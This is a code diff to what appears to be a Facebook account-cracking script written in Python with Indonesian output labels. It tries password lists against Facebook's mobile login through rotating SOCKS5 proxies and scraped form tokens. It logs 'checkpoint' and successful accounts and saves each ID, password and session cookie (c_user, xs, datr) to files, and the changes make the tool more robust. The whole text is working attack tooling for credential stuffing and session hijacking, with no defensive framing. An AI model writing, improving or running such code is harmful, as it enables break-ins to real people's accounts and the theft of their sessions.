@@ -1317,22 +1317,27 @@ def fanky_b_api(idf, pwv):
     rr = random.randint
     rc = random.choice
     bo = random.choice([m, k, h, b, u, x])
-    # ua = random.choice(fanuahehe)
-    ua = random.choice(fanuahehe)
+    ua = random.choice(fanuahehe) if fanuahehe else "Mozilla/5.0 (Linux; Android 10)"
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.update(des, description=f" {K2}•{H2} FANKY IP NEW {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
     for pw in pwv:
         try:
-            if 'ya' in ualuh:ua = ualu[0]
+            if 'ya' in ualuh and ualu:
+                ua = ualu[0]
+            if not prox:
+                continue
             nip = random.choice(prox)
             proxs = {'http': 'socks5://' + nip}
             requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
             soup = BeautifulSoup(requ.text, "html.parser")
             form = soup.find("form")
-            post_action = form.get("action") if form else None
-            if post_action and post_action.startswith("/"):
-                url_post = "https://secure.facebook.com" + post_action
+            if not form:
+                continue
+            post_action = form.get("action")
+            if not post_action or not post_action.startswith("/"):
+                continue
+            url_post = "https://secure.facebook.com" + post_action
             data = {
                 "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                 "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
@@ -1367,35 +1372,45 @@ def fanky_b_api(idf, pwv):
                 "Sec-Fetch-User": "?1",
                 "DNT": "1"
             }
-            # fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
-            po = ses.post(url_post,data=data,headers=head,allow_redirects=False,proxies=proxs)
-            if "checkpoint" in po.cookies.get_dict():
+            po = ses.post(url_post, data=data, headers=head, allow_redirects=False, proxies=proxs)
+            cookies = po.cookies.get_dict()
+            if "checkpoint" in cookies:
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                 prints(tree)
+                os.makedirs("CP", exist_ok=True)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
-            elif "c_user" in ses.cookies.get_dict():
+            elif "c_user" in cookies:
                 ok += 1
-                coki = ses.cookies.get_dict()
-                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
+                coki = cookies
+                kuki = (
+                    "datr=" + coki.get("datr", "") + ";" +
+                    "sb=" + coki.get("sb", "") + ";" +
+                    "locale=id_ID;" +
+                    "c_user=" + coki.get("c_user", "") + ";" +
+                    "xs=" + coki.get("xs", "") + ";" +
+                    "fr=" + coki.get("fr", "") + ";"
+                )
                 tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                os.makedirs("OK", exist_ok=True)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
                 break
             else:
                 continue
         except requests.exceptions.ConnectionError:
             time.sleep(31)
+        except Exception as e:
+            print(f"[ERROR] {e}")
     loop += 1
-
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__ == "__main__":
